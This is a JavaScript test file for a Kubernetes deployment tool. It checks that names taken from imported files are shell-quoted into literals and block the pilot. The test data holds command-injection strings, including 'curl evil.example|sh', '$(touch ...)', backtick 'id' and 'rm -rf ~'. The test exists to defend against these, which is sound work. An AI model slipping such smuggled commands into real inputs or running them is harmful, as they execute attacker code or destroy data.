// Names from imported files must never turn a displayed command into shell code.
const assert=require('node:assert/strict'),fs=require('node:fs'),{execFileSync}=require('node:child_process'),X=require('./dist/execution'),P=require('./dist/pilot');
const src=fs.readFileSync('./test-execution.cjs','utf8');
const {source,target,options}=new Function('require',src.slice(src.indexOf('const digest'),src.indexOf('const plan='))+';return {source,target,options};')(require);
const hostile=["web$(touch${IFS}/tmp/pwned)","web;curl evil.example|sh;#","web`id`","it's","a'\"$HOME\\n\nb",'web\nrm -rf ~'];
// shellQuote round-trips through a real shell as a single literal argument.
for(const value of hostile){const out=execFileSync('bash',['-c','printf "%s" '+X.shellQuote(value)],{encoding:'utf8'});assert.equal(out,value);}
// A crafted inventory name blocks the pilot, and the README still quotes it.
for(const value of hostile.slice(0,3)){
 const s=structuredClone(source);s.items[1].metadata.name=value;const id='app/Deployment/'+value;
 const plan=X.plan(s,target,{...options,pilot:{...options.pilot,workload:id}});
 assert(plan.blockers.some(b=>b.reason.includes('not a valid Kubernetes name')),value+': '+JSON.stringify(plan.blockers));
 assert(X.readme({...plan,workload:id}).includes('--confirm-workload '+X.shellQuote(id)));
}
const ns=structuredClone(source);for(const r of ns.items.slice(1))r.metadata.namespace='app;id';
assert(P.generate(ns,{workload:'app;id/Deployment/web'}).blockers.some(b=>b.reason.startsWith('Namespace name')));
const svc=structuredClone(source);svc.items[2].metadata.name='web$(id)';
assert(P.generate(svc,{workload:'app/Deployment/web'}).blockers.some(b=>b.reason.startsWith('Service name')));
// Valid names, including dotted Deployment names, are not blocked.
const dotted=structuredClone(source);dotted.items[1].metadata.name='web.v2';
assert(!P.generate(dotted,{workload:'app/Deployment/web.v2',target}).blockers.some(b=>b.reason.includes('valid Kubernetes name')));
// The on-screen command in app.js uses the same quoting.
assert(fs.readFileSync('./dist/app.js','utf8').includes("--confirm-workload ${esc(p.workload?X.shellQuote(p.workload):'WORKLOAD_ID')}"));
console.log('Shell quoting tests passed: hostile names round-trip as literals, block the pilot and are quoted in README and UI commands.');
